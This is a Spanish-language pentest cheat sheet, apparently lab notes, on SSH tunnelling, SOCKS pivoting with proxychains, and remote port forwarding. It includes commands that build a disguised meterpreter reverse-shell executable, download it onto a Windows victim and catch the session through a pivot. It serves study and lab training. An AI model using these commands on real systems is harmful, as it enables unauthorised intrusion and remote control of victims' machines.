## Dynamic port forwarding

| Comando                                                                                                                      | Descripción                                                                                                                                                                                                                                  | Ejemplo                                                              |
| ---------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- |
| ssh -L <puerto_escucha_atacante>:localhost:<puerto_a_escuchar_víctima> <user_ssh_víctima>@<ip_víctima>                       | Crea un túnel local: redirige un puerto de tu máquina atacante hacia un puerto en la máquina víctima. Todo lo que se conecte a <puerto_escucha_atacante> será enviado a localhost:<puerto_a_escuchar_víctima> en la víctima a través de SSH. | ssh -L 1234:localhost:3306 ubuntu@10.129.202.64                      |
| ssh -L <puerto_escucha>:localhost:<puerto_a_escuchar> -L <puerto_escucha>:localhost:<puerto_a_escuchar> ubuntu@10.129.202.64 | Crea múltiples túneles locales en una sola conexión SSH: redirige localhost:1234 de tu máquina al localhost:3306 de la víctima y localhost:8080 al localhost:80 de la víctima. Útil para exponer varios servicios remotos localmente.        | ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64 |
| netstat -antp \| grep \<puerto>                                                                                              | Muestra sockets de red en escucha y conexiones; filtrando por puerto puedes confirmar que tu máquina está escuchando en el puerto esperado (por ejemplo el puerto creado por ssh -L o ssh -D).                                               | netstat -antp \| grep 1234                                           |
| ssh -D \<puerto> \<user>@\<ip>                                                                                               | Levanta un **proxy SOCKS (dynamic port forward)** local: crea un SOCKS5 escuchando en `localhost:<puerto>` que encamina tráfico por la sesión SSH y permite pivotar hacia redes a las que la víctima puede acceder.                          | ssh -D 9050 ubuntu@10.129.202.64                                     |
| ssh -f -N -D \<puerto> \<user>@\<ip>                                                                                         | Igual que ssh -D pero: -f manda el proceso al background y -N evita lanzar shell interactiva. Útil para dejar el SOCKS en segundo plano.                                                                                                     | ssh -f -N -D 9050 ubuntu@10.129.202.64                               |
| proxychains4 \<comando>                                                                                                      | Envuelve una aplicación para forzar que su tráfico pase por el proxy definido en proxychains4.conf (ej. un SOCKS en 127.0.0.1:9050). Ideal para herramientas que no soportan SOCKS nativamente.                                              | proxychains4 nmap -sT -Pn -p1-1024 172.16.5.0/24                     |
## Remote/Reverse Port Forwarding with SSH

| Comando / Acción                                                                                                    | Descripción / notas clave                                                                                                                                                                                                         | Ejemplo                                                                                                                          |
| ------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe          | Genera el payload para que **la víctima** (Windows_A, la víctima) conecte al **pivot** (Ubuntu 172.16.5.129) en el puerto 8080. LHOST aquí = IP alcanzable por la víctima.                                                        |                                                                                                                                  |
| scp backupscript.exe ubuntu@\<ipPivot>:~/                                                                           | Copia el ejecutable al pivot (usa SSH).                                                                                                                                                                                           | `scp backupscript.exe ubuntu@172.16.5.129:~/`                                                                                    |
| `python3 -m http.server 8123` (en pivot)                                                                            | Levanta un servidor HTTP simple desde el pivot para que la víctima lo descargue (rápido y práctico en laboratorio).                                                                                                               | `cd /home/ubuntu && python3 -m http.server 8123`                                                                                 |
| PowerShell: `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`     | Descarga el payload desde Windows_A (máquina víctima)                                                                                                                                                                             | ver comando arriba                                                                                                               |
| use exploit/multi/handler + set payload windows/x64/meterpreter/reverse_https + set lhost 0.0.0.0 + set lport 8000` | Configura el handler en tu máquina atacante. Aquí `lhost` indica en qué interfaces escucha tu Metasploit. `0.0.0.0` = escuchar en todas las interfaces (útil si el reenvío/túnel entrega la conexión a localhost o a otra iface). |                                                                                                                                  |
| ssh -R \[bind_address:]remote_port:host:hostport user@server -vN                                                    | SSH Remote Port Forwarding: pide al `server` (pivot) que escuche en `remote_port` y reenvíe conexiones al destino `host:hostport` desde la máquina cliente que abrió el túnel.                                                    | Variante A (bind a IP del pivot, requiere `GatewayPorts yes`): `ssh -vN -R 172.16.5.129:8080:localhost:8000 ubuntu@172.16.5.129` |
